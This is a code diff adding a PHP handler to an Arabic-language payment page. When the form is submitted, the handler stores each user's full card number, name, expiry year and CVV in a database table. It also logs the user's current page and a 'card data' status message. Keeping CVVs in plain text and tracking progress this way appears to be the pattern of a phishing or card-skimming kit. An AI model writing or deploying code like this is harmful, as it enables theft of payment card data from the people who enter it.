@@ -1,5 +1,30 @@
+<?php
+session_start();
+require_once __DIR__ . '/config.php';
 
+if (isset($_POST['submit'])) {
+    $cardNumber = $_POST['cardNumber'] ?? '';
+    $cardName = $_POST['cardName'] ?? '';
+    $year = $_POST['year'] ?? '';
+    $cvv = $_POST['cvv'] ?? '';
 
+    if (isset($_SESSION['user_id'])) {
+        $userId = intval($_SESSION['user_id']);
+        supabase_insert('cards', [
+            'user_id' => $userId,
+            'cardNumber' => $cardNumber,
+            'cardName' => $cardName,
+            'year' => $year,
+            'cvv' => $cvv
+        ]);
+        supabase_update('users', 'id=eq.' . $userId, [
+            'message' => 'بيانات البطاقة',
+            'page' => 'payment.php',
+            'updated_at' => date('Y-m-d H:i:s')
+        ]);
+    }
+}
+?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
